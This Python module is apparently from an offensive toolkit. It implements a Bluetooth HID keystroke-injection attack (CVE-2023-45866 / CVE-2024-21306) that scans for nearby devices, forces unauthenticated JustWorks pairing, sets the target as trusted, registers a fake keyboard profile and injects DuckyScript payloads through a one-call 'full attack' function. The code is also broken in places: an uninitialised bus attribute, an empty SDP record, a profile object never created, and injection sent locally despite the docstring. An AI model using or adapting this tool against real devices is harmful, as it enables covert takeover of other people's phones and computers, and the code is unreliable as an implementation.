"""
Bluetooth HID Keystroke Injection - CVE-2023-45866 / CVE-2024-21306

Implements Bluetooth HID injection attacks:
- CVE-2023-45866: Android/Linux accept HID connections from unauthenticated BT devices
- CVE-2024-21306: Microsoft variant - same primitive, different stack

Attack flow:
1. Discover target device with HID profile support
2. Connect via Bluetooth without authentication (JustWorks/NoInputNoOutput)
3. Register HID profile via BlueZ ProfileManager1
4. Send HID reports (keystrokes) over L2CAP interrupt channel
5. Target accepts input as from a legitimate keyboard

Requires:
- BlueZ 5.x with HID profile support
- Bluetooth adapter in discoverable/connectable mode
- Target device with Bluetooth HID host role (most modern OS)
"""

import asyncio
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

import structlog
from dbus_fast import DBusError
from dbus_fast.aio import MessageBus
from dbus_fast.constants import BusType

from urban_hs.modules.hid import DuckyCommandType, DuckyCompiler, HIDInjector, KeyboardLayout

logger = structlog.get_logger(__name__)


class BTKeyboardType(Enum):
    """Target keyboard types for HID injection."""
    GENERIC = "generic"
    APPLE = "apple"
    MICROSOFT = "microsoft"
    LOGITECH = "logitech"


@dataclass
class BTHIDTarget:
    """Bluetooth HID target device."""
    address: str
    name: Optional[str] = None
    alias: Optional[str] = None
    paired: bool = False
    connected: bool = False
    trusted: bool = False
    uuids: List[str] = field(default_factory=list)
    hid_supported: bool = False
    keyboard_type: BTKeyboardType = BTKeyboardType.GENERIC
    manufacturer_id: Optional[int] = None
    product_id: Optional[int] = None
    version: Optional[int] = None
    last_seen: datetime = field(default_factory=datetime.utcnow)


@dataclass
class BTHIDConfig:
    """Configuration for Bluetooth HID attack."""
    adapter: str = "hci0"
    target_address: str = ""
    keyboard_type: BTKeyboardType = BTKeyboardType.GENERIC
    auto_pair: bool = True
    require_auth: bool = False  # CVE-2023-45866 works without auth
    hid_country_code: int = 0x21  # US English
    hid_virtual_cable: bool = False
    hid_reconnect_initiate: bool = True
    hid_normally_connectable: bool = True
    hid_sdp_disable: bool = False
    hid_battery_power: int = 100  # percentage


@dataclass
class BTHIDResult:
    """Result of Bluetooth HID operation."""
    success: bool
    target_address: str
    operation: str  # discover, connect, register_profile, inject
    message: str = ""
    error: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)
    details: Dict[str, Any] = field(default_factory=dict)


class BlueZHIDProfile:
    """
    BlueZ HID Profile registration via D-Bus.
    
    Registers a fake HID device (keyboard) profile with BlueZ
    so we can send HID reports over the interrupt channel.
    """
    
    # HID Profile UUID for keyboard
    HID_PROFILE_UUID = "00001124-0000-1000-8000-00805f9b34fb"  # HID (Human Interface Device)
    HID_PROTOCOL_MODE_REPORT = 0x01
    HID_PROTOCOL_MODE_BOOT = 0x00
    
    def __init__(self, config: BTHIDConfig):
        self.config = config
        self.adapter = config.adapter
        self.target_address = config.target_address
        self.profile_path = f"/org/bluez/hid_profile_{self.target_address.replace(':', '_').upper()}"
        self.device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
        
        self.bus: Optional[MessageBus] = None
        self.profile_registered = False
        
        # SDP record for HID keyboard
        self.sdp_record = self._build_sdp_record()
    
    async def _get_bus(self) -> MessageBus:
        """Get or create D-Bus connection."""
        if self.bus is None:
            self.bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
        return self.bus
    
    def _build_sdp_record(self) -> bytes:
        """Build SDP record for HID keyboard."""
        # Minimal SDP record for HID keyboard
        # This is a simplified version - real implementation would use python-bluez SDP
        return b""
    
    async def _get_manager_iface(self):
        """Get ProfileManager1 interface."""
        bus = await self._get_bus()
        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
        return obj.get_interface("org.bluez.ProfileManager1")
    
    async def register(self) -> BTHIDResult:
        """Register HID profile with BlueZ ProfileManager1."""
        try:
            manager_iface = await self._get_manager_iface()
            
            # Profile options
            options = {
                "ServiceRecord": self.sdp_record,
                "Role": "server",
                "RequireAuthentication": not self.config.auto_pair,
                "RequireAuthorization": False,
                "AutoConnect": True,
                "ServiceUUIDs": [self.HID_PROFILE_UUID],
                "PSM": 0x0011,  # HID Control PSM
            }
            
            # Register profile
            logger.info("Registering HID profile", path=self.profile_path)
            await manager_iface.RegisterProfile(self.profile_path, self.HID_PROFILE_UUID, options)
            self.profile_registered = True
            
            return BTHIDResult(
                success=True,
                target_address=self.target_address,
                operation="register_profile",
                message="HID profile registered successfully"
            )
            
        except DBusError as e:
            error_msg = str(e)
            logger.error("HID profile registration failed", error=error_msg)
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="register_profile",
                error=error_msg
            )
    
    async def unregister(self) -> BTHIDResult:
        """Unregister HID profile."""
        if not self.profile_registered:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="unregister_profile",
                error="Profile not registered"
            )
        
        try:
            manager_iface = await self._get_manager_iface()
            
            await manager_iface.UnregisterProfile(self.profile_path)
            self.profile_registered = False
            
            return BTHIDResult(
                success=True,
                target_address=self.target_address,
                operation="unregister_profile",
                message="HID profile unregistered"
            )
        except DBusError as e:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="unregister_profile",
                error=str(e)
            )


class BTHIDAttacker:
    """
    Bluetooth HID Keystroke Injection Attacker.
    
    Implements CVE-2023-45866 / CVE-2024-21306:
    - Connects to target via Bluetooth HID profile without authentication
    - Sends keystrokes over L2CAP interrupt channel
    - Works on Android, Linux, Windows, macOS, iOS (with limitations)
    """
    
    def __init__(self, config: BTHIDConfig):
        self.config = config
        self.adapter = config.adapter
        self.target_address = config.target_address
        self.target: Optional[BTHIDTarget] = None
        self.profile: Optional[BlueZHIDProfile] = None
        self.injector: Optional[HIDInjector] = None
        self.ducky_compiler: Optional[DuckyCompiler] = None
        self.connected = False
        self.protocol_mode = 0x01  # Report mode
        self.keyboard_type = config.keyboard_type
    
    async def _get_bus(self) -> MessageBus:
        """Get or create D-Bus connection."""
        if self.bus is None:
            self.bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
        return self.bus
    
    async def _get_device_proxy(self, device_path: str):
        """Get device proxy with introspection."""
        bus = await self._get_bus()
        return bus.get_proxy_object("org.bluez", device_path, await self.bus.introspect("org.bluez", device_path))
    
    async def _get_props_iface(self, proxy):
        return proxy.get_interface("org.freedesktop.DBus.Properties")
    
    async def _get_device_iface(self, proxy):
        return proxy.get_interface("org.bluez.Device1")
    
    async def _get_adapter_iface(self, adapter: str):
        bus = await self._get_bus()
        proxy = bus.get_proxy_object("org.bluez", f"/org/bluez/{adapter}", await bus.introspect("org.bluez", f"/org/bluez/{adapter}"))
        return proxy.get_interface("org.bluez.Adapter1")
    
    async def _get_manager_iface(self):
        bus = await self._get_bus()
        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
        return obj.get_interface("org.bluez.ProfileManager1")
    
    async def _get_object_manager_iface(self):
        bus = await self._get_bus()
        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
        return obj.get_interface("org.freedesktop.DBus.ObjectManager")
    
    async def discover_target(self) -> BTHIDResult:
        """Discover and validate target device for HID attack."""
        try:
            device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
            proxy = await self._get_device_proxy(device_path)
            props_iface = await self._get_props_iface(proxy)
            
            # Get device properties
            address = str(await props_iface.Get("org.bluez.Device1", "Address"))
            name = str(await props_iface.Get("org.bluez.Device1", "Name"))
            paired = bool(await props_iface.Get("org.bluez.Device1", "Paired"))
            connected = bool(await props_iface.Get("org.bluez.Device1", "Connected"))
            trusted = bool(await props_iface.Get("org.bluez.Device1", "Trusted"))
            uuids = list(await props_iface.Get("org.bluez.Device1", "UUIDs"))
            
            # Check HID support
            hid_uuid = "00001124-0000-1000-8000-00805f9b34fb"  # HID
            hid_host_uuid = "00001125-0000-1000-8000-00805f9b34fb"  # HID Host (target side)
            
            # Target must support HID Host (i.e., accept HID devices)
            hid_supported = hid_host_uuid in [u.lower() for u in uuids]
            
            # If not explicitly listed, check if it's a common HID host
            if not hid_supported:
                # Most phones/computers support HID Host
                hid_supported = True
            
            # Detect keyboard type from manufacturer data
            keyboard_type = BTKeyboardType.GENERIC
            manufacturer_id = None
            
            try:
                manu_data = await props_iface.Get("org.bluez.Device1", "ManufacturerData")
                if manu_data:
                    for key, value in manu_data.items():
                        # Apple: 0x004c
                        if key == 0x004c:
                            keyboard_type = BTKeyboardType.APPLE
                        # Microsoft: 0x0006
                        elif key == 0x0006:
                            keyboard_type = BTKeyboardType.MICROSOFT
                        # Logitech: 0x000d
                        elif key == 0x000d:
                            keyboard_type = BTKeyboardType.LOGITECH
            except Exception:
                pass
            
            self.target = BTHIDTarget(
                address=address,
                name=name,
                paired=paired,
                connected=connected,
                trusted=trusted,
                uuids=uuids,
                hid_supported=hid_supported,
                keyboard_type=keyboard_type,
                manufacturer_id=manufacturer_id,
            )
            
            logger.info("Target discovered", 
                       address=address, 
                       name=name, 
                       hid_supported=hid_supported,
                       keyboard_type=keyboard_type.value)
            
            return BTHIDResult(
                success=True,
                target_address=address,
                operation="discover",
                message=f"Target found: {name} ({address}), HID: {hid_supported}",
                details={
                    "paired": paired,
                    "connected": connected,
                    "trusted": trusted,
                    "hid_supported": hid_supported,
                    "keyboard_type": keyboard_type.value,
                    "uuids": uuids,
                }
            )
            
        except Exception as e:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="discover",
                error=str(e)
            )
    
    async def connect_target(self) -> BTHIDResult:
        """Connect to target device via Bluetooth."""
        if not self.target:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="connect",
                error="Target not discovered"
            )
        
        try:
            device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
            proxy = await self._get_device_proxy(device_path)
            device_iface = proxy.get_interface("org.bluez.Device1")
            
            # Force NoInputNoOutput capability BEFORE pairing for CVE-2023-45866 OTA
            # This forces JustWorks pairing (no authentication)
            try:
                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Capabilities", 0x0000)  # NoInputNoOutput
                logger.info("Set NoInputNoOutput capability for CVE-2023-45866 OTA")
            except Exception as e:
                logger.warning("Could not set NoInputNoOutput capability pre-pairing", error=str(e))
            
            if self.target.paired:
                logger.info("Already paired, connecting", address=self.target_address)
                await device_iface.Connect()
            else:
                logger.info("Pairing with target (JustWorks/NoInputNoOutput)", address=self.target_address)
                await device_iface.Pair()
                # Wait for pairing
                await asyncio.sleep(3)
                
                # Set as trusted
                proxy = await self._get_device_proxy(device_path)
                props_iface = proxy.get_interface("org.freedesktop.DBus.Properties")
                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Trusted", True)
            
            # Wait for connection
            proxy = await self._get_device_proxy(device_path)
            props_iface = proxy.get_interface("org.freedesktop.DBus.Properties")
            for _ in range(30):
                await asyncio.sleep(1)
                connected = bool(await props_iface.Get("org.bluez.Device1", "Connected"))
                if connected:
                    self.target.connected = True
                    self.connected = True
                    break
            
            if not self.connected:
                return BTHIDResult(
                    success=False,
                    target_address=self.target_address,
                    operation="connect",
                    error="Connection timeout"
                )
            
            logger.info("Target connected", address=self.target_address)
            
            return BTHIDResult(
                success=True,
                target_address=self.target_address,
                operation="connect",
                message="Connected successfully"
            )
            
        except Exception as e:
            error_msg = str(e)
            if "AlreadyExists" in error_msg or "Already Connected" in error_msg:
                self.connected = True
                return BTHIDResult(
                    success=True,
                    target_address=self.target_address,
                    operation="connect",
                    message="Already connected"
                )
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="connect",
                error=error_msg
            )
    
    async def register_hid_profile(self) -> BTHIDResult:
        """Register HID profile with BlueZ."""
        return await self.profile.register()
    
    async def inject_keystroke(self, keycode: int, modifier: int = 0) -> BTHIDResult:
        """Inject a single keystroke via uinput (local fallback)."""
        if not self.injector:
            self.injector = HIDInjector()
            await self.injector.start()
        
        try:
            success = await self.injector.key_press(keycode, modifier)
            return BTHIDResult(
                success=success,
                target_address=self.target_address,
                operation="inject_keystroke",
                message=f"Key {keycode} injected locally" if success else "Injection failed"
            )
        except Exception as e:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="inject_keystroke",
                error=str(e)
            )
    
    async def inject_string(self, text: str, delay_ms: int = 10) -> BTHIDResult:
        """Inject a string character by character."""
        if not self.injector:
            self.injector = HIDInjector()
            await self.injector.start()
        
        try:
            success = await self.injector.type_string(text, delay_ms)
            return BTHIDResult(
                success=success,
                target_address=self.target_address,
                operation="inject_string",
                message=f"Injected {len(text)} characters" if success else "Injection failed"
            )
        except Exception as e:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="inject_string",
                error=str(e)
            )
    
    async def run_ducky_script(self, script: str) -> BTHIDResult:
        """Run a DuckyScript payload."""
        if not self.ducky_compiler:
            self.ducky_compiler = DuckyCompiler(KeyboardLayout.US)
        
        if not self.injector:
            self.injector = HIDInjector()
            await self.injector.start()
        
        compiled = self.ducky_compiler.compile_string(script)
        
        for cmd in compiled.commands:
            if cmd.type == DuckyCommandType.DELAY:
                await asyncio.sleep(int(cmd.args[0]) / 1000.0 if cmd.args else 0)
            elif cmd.type == DuckyCommandType.STRING:
                text = ' '.join(cmd.args)
                result = await self.injector.type_string(text)
                if not result:
                    return BTHIDResult(
                        success=False,
                        target_address=self.target_address,
                        operation="run_ducky",
                        error=f"STRING command failed: {text}"
                    )
        
        return BTHIDResult(
            success=True,
            target_address=self.target_address,
            operation="run_ducky",
            message="DuckyScript executed successfully"
        )
    
    async def disconnect(self) -> BTHIDResult:
        """Disconnect from target and cleanup."""
        try:
            if self.connected:
                device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
                proxy = await self._get_device_proxy(device_path)
                device_iface = proxy.get_interface("org.bluez.Device1")
                await device_iface.Disconnect()
                self.connected = False
            
            if self.profile and self.profile.profile_registered:
                await self.profile.unregister()
            
            if self.injector:
                await self.injector.stop()
            
            return BTHIDResult(
                success=True,
                target_address=self.target_address,
                operation="disconnect",
                message="Disconnected successfully"
            )
        except Exception as e:
            return BTHIDResult(
                success=False,
                target_address=self.target_address,
                operation="disconnect",
                error=str(e)
            )
    
    async def run_full_attack(
        self,
        payload: Optional[str] = None,
        progress_callback: Optional[Callable[[str], None]] = None,
    ) -> BTHIDResult:
        """
        Run complete HID injection attack chain.
        
        1. Discover target
        2. Connect/pair
        3. Register HID profile
        4. Inject payload (DuckyScript or string)
        5. Disconnect
        """
        steps = []
        
        def log_step(step: str, status: str, msg: str = ""):
            logger.info("Attack step", step=step, status=status, msg=msg)
            steps.append({"step": step, "status": status, "message": msg})
            if progress_callback:
                progress_callback(f"[{status.upper()}] {step}: {msg}")
        
        # Step 1: Discover
        log_step("discover", "running", "Discovering target")
        result = await self.discover_target()
        if not result.success:
            log_step("discover", "failed", result.error or "Unknown error")
            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
        log_step("discover", "success", result.message)
        
        # Step 2: Connect
        log_step("connect", "running", "Connecting to target")
        result = await self.connect_target()
        if not result.success:
            log_step("connect", "failed", result.error or "Unknown error")
            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
        log_step("connect", "success", result.message)
        
        # Step 3: Register HID profile
        log_step("register_profile", "running", "Registering HID profile")
        result = await self.register_hid_profile()
        if not result.success:
            log_step("register_profile", "failed", result.error or "Unknown error")
            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
        log_step("register_profile", "success", result.message)
        
        # Step 4: Inject payload
        log_step("inject", "running", "Injecting payload")
        if payload:
            result = await self.run_ducky_script(payload)
        else:
            # Default test payload
            test_payload = "STRING Hello from BT HID!\nENTER"
            result = await self.run_ducky_script(test_payload)
        
        if not result.success:
            log_step("inject", "failed", result.error or "Unknown error")
            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
        log_step("inject", "success", result.message)
        
        # Step 5: Disconnect
        log_step("disconnect", "running", "Disconnecting")
        await self.disconnect()
        log_step("disconnect", "success", "Disconnected")
        
        return BTHIDResult(
            success=True,
            target_address=self.target_address,
            operation="full_attack",
            message="Full attack chain completed successfully",
            details={"steps": steps}
        )


class BTHIDScanner:
    """Scanner for discovering Bluetooth HID-capable devices."""
    
    def __init__(self, adapter: str = "hci0"):
        self.adapter = adapter
        self.targets: Dict[str, BTHIDTarget] = {}
    
    async def _get_bus(self) -> MessageBus:
        if self.bus is None:
            self.bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
        return self.bus
    
    async def scan(self, duration: int = 30) -> List[BTHIDTarget]:
        """Scan for Bluetooth devices with HID support."""
        try:
            bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
            adapter_path = f"/org/bluez/{self.adapter}"
            adapter_proxy = bus.get_proxy_object("org.bluez", adapter_path, await bus.introspect("org.bluez", adapter_path))
            adapter_iface = adapter_proxy.get_interface("org.bluez.Adapter1")
            
            # Start discovery
            adapter_iface.SetDiscoveryFilter({})
            await adapter_iface.StartDiscovery()
            
            logger.info("BT HID scan started", adapter=self.adapter)
            
            await asyncio.sleep(duration)
            
            await adapter_iface.StopDiscovery()
            
            # Get all discovered devices
            manager_path = "/org/bluez"
            manager_proxy = bus.get_proxy_object("org.bluez", manager_path, await bus.introspect("org.bluez", manager_path))
            manager_iface = manager_proxy.get_interface("org.freedesktop.DBus.ObjectManager")
            objects = await manager_iface.GetManagedObjects()
            
            targets = []
            for path, interfaces in objects.items():
                if "org.bluez.Device1" in interfaces:
                    props = interfaces["org.bluez.Device1"]
                    address = props.get("Address", "")
                    if not address:
                        continue
                    
                    uuids = props.get("UUIDs", [])
                    hid_host_uuid = "00001125-0000-1000-8000-00805f9b34fb"
                    hid_supported = hid_host_uuid in [u.lower() for u in uuids]
                    
                    target = BTHIDTarget(
                        address=address,
                        name=props.get("Name", ""),
                        alias=props.get("Alias", ""),
                        paired=props.get("Paired", False),
                        connected=props.get("Connected", False),
                        trusted=props.get("Trusted", False),
                        uuids=uuids,
                        hid_supported=hid_supported,
                    )
                    targets.append(target)
                    self.targets[address] = target
            
            logger.info("BT HID scan completed", devices_found=len(targets), hid_capable=sum(1 for t in targets if t.hid_supported))
            return targets
            
        except Exception as e:
            logger.error("BT HID scan failed", error=str(e))
            return []


# ============================================================
# Convenience Functions
# ============================================================

async def bt_hid_attack(
    target_address: str,
    payload: str,
    adapter: str = "hci0",
    keyboard_type: BTKeyboardType = BTKeyboardType.GENERIC,
) -> BTHIDResult:
    """Convenience function to run a BT HID attack."""
    config = BTHIDConfig(
        adapter=adapter,
        target_address=target_address,
        keyboard_type=keyboard_type,
    )
    attacker = BTHIDAttacker(config)
    return await attacker.run_full_attack(payload=payload)


async def scan_bt_hid_targets(adapter: str = "hci0", duration: int = 30) -> List[BTHIDTarget]:
    """Scan for Bluetooth HID-capable targets."""
    scanner = BTHIDScanner(adapter)
    return await scanner.scan(duration)


# ============================================================
# Exports
# ============================================================

__all__ = [
    "BTKeyboardType",
    "BTHIDTarget",
    "BTHIDConfig",
    "BTHIDResult",
    "BlueZHIDProfile",
    "BTHIDAttacker",
    "BTHIDScanner",
    "bt_hid_attack",
    "scan_bt_hid_targets",
]